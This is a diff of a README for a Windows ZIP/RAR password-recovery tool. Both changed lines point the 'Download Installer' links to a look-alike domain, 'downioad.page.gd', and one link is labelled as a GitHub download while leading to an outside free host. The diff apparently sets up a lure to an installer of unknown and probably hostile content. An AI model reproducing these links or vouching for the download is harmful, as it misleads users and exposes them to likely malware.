@@ -2,7 +2,7 @@
 
 ZipRar Password Recovery 2026 is a powerful and efficient tool designed to help users recover lost or forgotten passwords from ZIP and RAR archive files. Whether you've misplaced a password or inherited a secured archive, this software provides a reliable solution with advanced recovery techniques. Built specifically for Windows 10 and Windows 11, it ensures compatibility and optimal performance on modern desktop systems.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -62,7 +62,7 @@ Since this is a free tool, there is no purchase or money-back guarantee. However
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
